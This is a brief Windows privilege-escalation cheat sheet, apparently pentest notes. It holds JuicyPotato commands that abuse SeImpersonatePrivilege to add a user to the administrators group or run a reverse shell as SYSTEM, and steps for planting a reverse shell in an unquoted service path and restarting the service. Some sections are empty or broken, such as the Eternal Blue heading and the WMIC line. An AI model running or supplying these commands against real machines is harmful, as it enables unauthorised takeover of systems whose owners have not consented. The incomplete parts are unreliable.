# Privesc

## MS17-010 - Eternal Blue


## Abuse SeImpersonatePrivilege

```
➤ 1. Verify that 'SeImpersonatePrivilege' privilege is enabled.

C:\Users\Lexis>whoami /priv
Informations de privilèges
----------------------

Privilege Name                Description                                  State
============================= ============================================ =========
SeShutdownPrivilege           Stop the system                              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                     Enabled
SeImpersonatePrivilege        Impersonate a client after authentication    Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set               Disabled

➤ 2. Import JuicyPotato on the victim

➤ 3. Basic attacks without specific CLSID

• Add a user in the administrators group
.\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t * -a "/c net localgroup administrators {MY_EXISTING_USER} /add"

• Execute a reverse shell as NT AUTHORITY\SYSTEM
.\JuicyPotato.exe -l 1337 -p C:\Users\public\rshell.exe -t *

➤ 4. Using specific CLSID

• helper : https://ohpe.it/juicy-potato/CLSID/

• Manual CLSID dectection based on OS version
https://ohpe.it/juicy-potato/CLSID/

• Automated CLSID detection scripts
.\GetCLSID.ps1
or 
.\clisd-detector.bat

• Add a user in the administrators group using the specific CLSID
.\JuicyPotato.exe -l 1337 -p C:\Windows\system32\cmd .exe -t {CLSID} -a "/c net localgroup administrators {MY_EXISTING_USER} /add"
```

## Unquoted Service Paths
```
➤ 0. Explanation
Windows would try to locate and execute programs in the following order:
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe

➤ 1. Find Services With Unquoted Paths
• Using sc
sc query
sc qc service name

• Using 
Using WMIC

➤ 2. Look for Binary_path_name (Binary with space) and for each of them, check if the path is unquoted ('').
Vulnerable example: C:\Program Files\Some Folder\Service.exe

➤ 3. Verify that we can write into one of the subfolder
icacls "C:\Program Files\Some Folder\"

➤ 4. Create a reverse shell named Some.exe in 'C:\Program Files\Some Folder\'

➤ 6. Restart the service linked with service.exe
sc stop SERVICENAME
sc start SERVICENAME

